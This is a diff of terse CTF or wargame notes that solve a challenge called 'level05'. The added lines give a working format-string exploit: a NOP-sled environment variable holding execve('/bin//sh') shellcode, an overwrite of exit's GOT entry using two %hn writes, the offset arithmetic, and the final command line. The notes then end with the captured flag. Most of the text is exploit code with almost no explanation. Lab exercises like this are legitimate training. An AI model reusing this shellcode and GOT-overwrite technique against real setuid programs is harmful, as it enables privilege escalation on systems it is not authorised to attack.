@@ -1,17 +1,22 @@
-0xffffd678 + 12 = 0xffffd684
+export CODE=$(python -c "print '\x90' * 1000 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80'")
 
-1er %n		d684 : x1
+We take as goal "find CODE=" + 500  = 0xffffdd95
 
-2eme %n		ffff : x2
+replace GOT table of exit by 0xffffdd95
+
+1st %n		dd95 : x1
+
+2nd %n		ffff : x2
+
+cat <(python -c "print '\xe0\x97\x04\x08' + '\xaa\xbb\xcc\xdd' + '\xe2\x97\x04\x08' + '%10x' * 8 + '%{x1}x' + '%hn' + '%{x2}x' + '%hn'") - | /home/users/level05/level05
+
+	4 + 4 + 4 + 10 * 8 + x1 = dd95
+	4 + 4 + 4 + 10 * 8 + x1 + x2 = ffff
+
+x1 = 56633
+x2 = 8810
+
+cat <(python -c "print '\xe0\x97\x04\x08' + '\xaa\xbb\xcc\xdd' + '\xe2\x97\x04\x08' + '%10x' * 8  + '%56633x' + '%hn' + '%8810x' + '%hn'") - | /home/users/level05/level05
 
 
-
-cat <(python -c "print '\xdc\x97\x04\x08' + '\xaa\xbb\xcc\xdd' + '\xe0\x97\x04\x08' + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80' + '%10x' * 8 + '%{x1}x' + '%hn' + '%{x2}x' + '%hn'") - | /home/users/level05/level05
-
-	4 + 4 + 4 + 24 + 10 * 8 + x1 = d684
-	4 + 4 + 4 + 24 + 10 * 8 + x1 + x2 = ffff
-
-
-x1 = 54800
-
-x2 = 10619
+flag: h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
